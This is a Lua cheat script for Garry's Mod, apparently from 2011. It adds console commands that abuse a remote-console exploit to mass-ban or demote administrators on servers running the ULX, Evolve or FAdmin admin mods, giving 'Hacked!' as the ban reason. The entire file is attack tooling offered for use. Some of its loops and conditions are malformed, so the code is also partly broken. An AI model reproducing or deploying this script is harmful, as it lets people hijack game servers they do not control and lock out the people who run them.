--[[
	autorun/client/Admins.lua
	/FL-TPK\ Anthr4X (Swe)
	===DStream===
]]

// Script to deal with admins when you done the VLUA_RUN exploit.
// Anthr4x292 - 2011-06-15
// Example command: anthrax_banadmins ulx "Lolwut?"

local function BanAdmins(ply, command, args)
	if args[1] == "ulx" then
		for k, v in pairs(player.GetAll()) do
			if v != LocalPlayer() then
				local reason = args[2] or " Hacked!"
				RunConsoleCommand("lol_rcon", "ulx ban " .. v:Nick() .. " 0 " .. reason)
				print("Banned admin/superadmin " .. v:Nick() .. "!")
			end
		end
	elseif args[1] == "evolve" then
		for k, v in pairs(player.GetAll()) do
			if v:IsAdmin() or v:IsSuperAdmin() and v != LocalPlayer() then
				local reason = args[2] or " Hacked!"
				RunConsoleCommand("exploit_rcon")
				RunConsoleCommand("lol_rcon", "ev ban " .. v:Nick() .. " 0 " .. reason)
				print("Banned admin/superadmin " .. v:Nick() .. "!")
			end
		end
	elseif args[1] == "fadmin" then
		for k, v in pairs(player.GetAll()) and v != LocalPlayer() do
			if v:IsAdmin() or v:IsSuperAdmin() then
				local reason = args[2] or " Hacked!"
				RunConsoleCommand("exploit_rcon")
				RunConsoleCommand("lol_rcon", "FAdmin ban " .. v:Nick() .. " 0 " .. reason)
				print("Banned admin/superadmin " .. v:Nick() .. "!")
			end
		end
	else
		print("You must select a valid admin mod!\n")
		print("Use one of these arguments: 'fadmin', 'ulx', 'evolve'")
	end
end

local function DemoteAdmins(ply, command, args)
	if args[1] == "ulx" then
		for k, v in pairs(player.GetAll()) do
			RunConsoleCommand("lol_rcon", "ulx removeuser " ..  v:Name())
			print("Demoted admin/superadmin " .. v:Nick() .. "!")
		end
	elseif args[1] == "evolve" then
		for k, v in pairs(player.GetAll()) do
			if v:IsAdmin() or v:IsSuperAdmin() and v != LocalPlayer() then
				RunConsoleCommand("exploit_rcon")
				RunConsoleCommand("lol_rcon", "ev rank " .. v:Nick() .. " guest")
				print("Demoted admin/superadmin " .. v:Nick() .. "!")
			end
		end
	else
		print("You must select a valid admin mod!\n")
		print("Use one of these arguments: 'ulx', 'evolve'")
	end
end

concommand.Add("anthrax_banadmins", BanAdmins)
concommand.Add("anthrax_demoteadmins", DemoteAdmins)